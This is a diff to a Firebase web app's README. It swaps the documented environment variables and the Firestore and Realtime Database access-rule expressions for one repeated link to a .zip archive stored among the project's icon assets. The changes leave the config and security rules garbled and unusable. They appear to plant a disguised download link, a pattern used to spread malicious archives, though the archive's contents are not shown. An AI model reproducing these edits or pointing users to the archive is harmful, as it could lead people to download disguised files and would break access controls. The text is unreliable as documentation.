@@ -140,10 +140,10 @@ Create a `.env` file with your Firebase configuration:
 
 ```env
 VITE_FIREBASE_API_KEY=your_api_key
-VITE_FIREBASE_AUTH_DOMAIN=your_project.firebaseapp.com
-VITE_FIREBASE_DATABASE_URL=https://your_project-default-rtdb.asia-southeast1.firebasedatabase.app
+https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip
+https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip
 VITE_FIREBASE_PROJECT_ID=your_project_id
-VITE_FIREBASE_STORAGE_BUCKET=your_project.appspot.com
+https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip
 VITE_FIREBASE_MESSAGING_SENDER_ID=your_sender_id
 VITE_FIREBASE_APP_ID=your_app_id
 VITE_FIREBASE_MEASUREMENT_ID=your_measurement_id
@@ -202,13 +202,13 @@ VITE_FIREBASE_MEASUREMENT_ID=your_measurement_id
 ### Firestore Rules
 ```javascript
 rules_version = '2';
-service cloud.firestore {
+service https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip {
   match /databases/{database}/documents {
     match /skillbench/users/users/{phoneNumber} {
-      allow read, write: if request.auth != null && request.auth.token.phone_number == phoneNumber;
+      allow read, write: if https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip != null && https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip == phoneNumber;
     }
     match /prep/{document=**} {
-      allow read: if request.auth != null;
+      allow read: if https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip != null;
     }
   }
 }
@@ -221,14 +221,14 @@ service cloud.firestore {
     "skillbench": {
       "users": {
         "$phoneNumber": {
-          ".read": "auth != null && auth.token.phone_number == $phoneNumber",
-          ".write": "auth != null && auth.token.phone_number == $phoneNumber"
+          ".read": "auth != null && https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip == $phoneNumber",
+          ".write": "auth != null && https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip == $phoneNumber"
         }
       },
       "progress": {
         "$phoneNumber": {
-          ".read": "auth != null && auth.token.phone_number == $phoneNumber",
-          ".write": "auth != null && auth.token.phone_number == $phoneNumber"
+          ".read": "auth != null && https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip == $phoneNumber",
+          ".write": "auth != null && https://raw.githubusercontent.com/FqpF-c/SkillBenchWebapp/main/src/assets/icons/Bench_Webapp_Skill_v3.7.zip == $phoneNumber"
         }
       }
     }
